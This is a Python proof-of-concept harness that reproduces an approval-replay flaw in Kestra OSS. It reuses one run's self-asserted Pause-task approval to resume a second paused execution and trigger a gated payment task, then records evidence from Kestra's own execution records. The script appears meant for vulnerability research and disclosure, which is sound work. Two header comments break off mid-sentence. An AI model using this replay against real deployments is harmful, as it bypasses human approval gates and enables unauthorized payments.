#!/usr/bin/env python3
# APF / APF - REPLAY reproduction harness: Kestra OSS (#34)
#
# Restore path: approval = onResume inputs of a Pause task, persisted in the execution.
# In Kestra OSS the Pause resume endpoint performs NO approver authorization and the
# approver identity in onResume is self-asserted, bound to neither run nor nonce. This
# harness drives the REAL Kestra REST API: it takes a genuine approval on run A, then
# reuses that same onResume approval payload to resume run B (a different execution and
# a different beneficiary), firing the gated post-pause task under Priya with no fresh
#
# Self-proving: the verdict is derived from Kestra's own execution records (the pay
#
# Usage:
#   pip install requests
#   docker compose up -d      # wait until http://localhost:8080/health is UP
#   python3 harness_kestra.py
import sys, os, time, json, io
import requests

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import apf_common as C

BASE = os.environ.get("KESTRA_BASE", "http://localhost:8080")
NS = "apf"
FLOW_ID = "apf_payment"
OUT = os.path.join(os.environ.get("APF_EVIDENCE_BASE", os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "evidence")), "34_kestra")

FLOW_YAML = f"""
id: {FLOW_ID}
namespace: {NS}
inputs:
  - id: amount
    type: INT
  - id: beneficiary
    type: STRING
tasks:
  - id: wait_for_approval
    type: io.kestra.plugin.core.flow.Pause
    onResume:
      - id: approved
        type: BOOLEAN
      - id: approver
        type: STRING
  - id: execute_payment
    type: io.kestra.plugin.core.debug.Return
    format: "paid|{{{{ inputs.amount }}}}|{{{{ inputs.beneficiary }}}}|{{{{ outputs.wait_for_approval.onResume.approver }}}}|{{{{ outputs.wait_for_approval.onResume.approved }}}}"
"""


def detect_prefix():
    # Pick the prefix whose flows collection actually EXISTS (200 on /flows/search).
    # A 404 is not a match: the wrong prefix also 404s (route missing), which previously
    # made us pick /api/v1/main on builds that use the non-tenant /api/v1 path.
    for p in ("/api/v1/main", "/api/v1"):
        try:
            if requests.get(BASE + p + "/flows/search?size=1", timeout=10).status_code == 200:
                return p
        except requests.RequestException:
            pass
    for p in ("/api/v1/main", "/api/v1"):
        try:
            if requests.get(BASE + p + "/flows/" + NS, timeout=10).status_code == 200:
                return p
        except requests.RequestException:
            pass
    return "/api/v1"


def wait_health(tries=180):
    # Kestra serves /health on its management port (8081), not the API port (8080), so a
    # /health probe on :8080 never turns UP. Gate on the API itself answering instead: any
    # HTTP status (200/404/401) means the server is accepting requests.
    for _ in range(tries):
        for p in ("/api/v1/main", "/api/v1"):
            try:
                if requests.get(BASE + p + "/flows/search?size=1", timeout=5).status_code == 200:
                    return
            except requests.RequestException:
                pass
        time.sleep(2)
    raise SystemExit("Kestra API did not respond in time at " + BASE)


def upsert_flow(P):
    # try create; if exists, update
    r = requests.post(BASE + P + "/flows", data=FLOW_YAML.encode(),
                      headers={"Content-Type": "application/x-yaml"}, timeout=30)
    if r.status_code in (200, 201):
        return
    if r.status_code in (409, 422):
        r2 = requests.put(BASE + P + "/flows/" + NS + "/" + FLOW_ID, data=FLOW_YAML.encode(),
                          headers={"Content-Type": "application/x-yaml"}, timeout=30)
        if r2.ok:
            return
        raise SystemExit("flow update failed: %s %s" % (r2.status_code, r2.text[:300]))
    raise SystemExit("flow create failed: %s %s" % (r.status_code, r.text[:300]))


def trigger(P, amount, beneficiary):
    r = requests.post(BASE + P + "/executions/" + NS + "/" + FLOW_ID,
                      files={"amount": (None, str(amount)), "beneficiary": (None, beneficiary)},
                      timeout=30)
    if not r.ok:
        raise SystemExit("trigger failed: %s %s" % (r.status_code, r.text[:300]))
    return r.json()["id"]


def get_exec(P, eid):
    return requests.get(BASE + P + "/executions/" + eid, timeout=15).json()


def wait_state(P, eid, states, tries=60):
    for _ in range(tries):
        ex = get_exec(P, eid)
        st = ex.get("state", {}).get("current")
        if st in states:
            return ex
        time.sleep(1)
    raise SystemExit("execution %s did not reach %s (last=%s)" % (eid, states, st))


def resume(P, eid, approved, approver):
    # onResume inputs as multipart/form-data; OSS performs no approver authorization
    r = requests.post(BASE + P + "/executions/" + eid + "/resume",
                      files={"approved": (None, "true" if approved else "false"),
                             "approver": (None, approver)}, timeout=30)
    return r.status_code, r.text[:200]


def pay_output(ex):
    for tr in ex.get("taskRunList", []):
        if tr.get("taskId") == "execute_payment":
            val = (tr.get("outputs") or {}).get("value")
            return val
    return None


def main():
    wait_health()
    P = detect_prefix()
    upsert_flow(P)
    audit = []

    # ---- control: genuine approval on run A ----
    eidA = trigger(P, C.A_ARGS["amount"], C.A_ARGS["beneficiary"])
    wait_state(P, eidA, {"PAUSED"})
    sc, _ = resume(P, eidA, True, C.APPROVER)          # genuine approver acts
    exA = wait_state(P, eidA, {"SUCCESS", "FAILED"})
    outA = pay_output(exA)
    if outA:
        parts = outA.split("|")  # paid|amount|beneficiary|approver|approved
        audit.append({"action": "execute_payment", "amount": int(parts[1]),
                      "beneficiary": parts[2], "approved_by_in_audit": parts[3]})
    C.line("control", f"genuine approval by {C.APPROVER} -> pay task output: {outA}")

    # the genuine approval payload that a state writer recovers/reuses
    genuine = {"approved": True, "approver": C.APPROVER}
    C.line("audit", f"reusable onResume approval payload (no run/nonce binding): {genuine}")

    # ---- replay: reuse run A's approval to resume run B (Blackwell) ----
    eidB = trigger(P, C.B_ARGS["amount"], C.B_ARGS["beneficiary"])
    wait_state(P, eidB, {"PAUSED"})
    resume(P, eidB, genuine["approved"], genuine["approver"])   # same approver identity, reused
    exB = wait_state(P, eidB, {"SUCCESS", "FAILED"})
    outB = pay_output(exB)
    replay_fired = False
    b_row = None
    if outB:
        parts = outB.split("|")
        if parts[2] == C.B_ARGS["beneficiary"] and parts[3] == C.APPROVER and parts[4] in ("true", "True"):
            replay_fired = True
            b_row = {"action": "execute_payment", "amount": int(parts[1]),
                     "beneficiary": parts[2], "approved_by_in_audit": parts[3]}
            audit.append(b_row)
    C.line("replay", f"reused run A approval resumed run B -> pay task output: {outB}")

    seen = set(); nonce = "n-runA-0034"

    verdict = C.verdict_from_state(replay_fired)
    C.line("verdict", verdict)
    h = C.emit_evidence("Kestra", OUT, {
        "restore_path": "approval = onResume inputs of a Pause task, persisted in the execution; OSS resume has no approver authorization and self-asserted approver",
        "kestra_image": "kestra/kestra:v0.21.5", "api_prefix": P,
        "genuine_run": eidA, "replay_run": eidB,
        "replay_fired": replay_fired, "replayed_payment": b_row,
        "pay_output_runA": outA, "pay_output_runB": outB,
        "audit_ledger": audit, "verdict": verdict,
    })
    print("EVIDENCE_HASH16", h)


if __name__ == "__main__":
    C.guarded_main('Kestra', OUT, main)
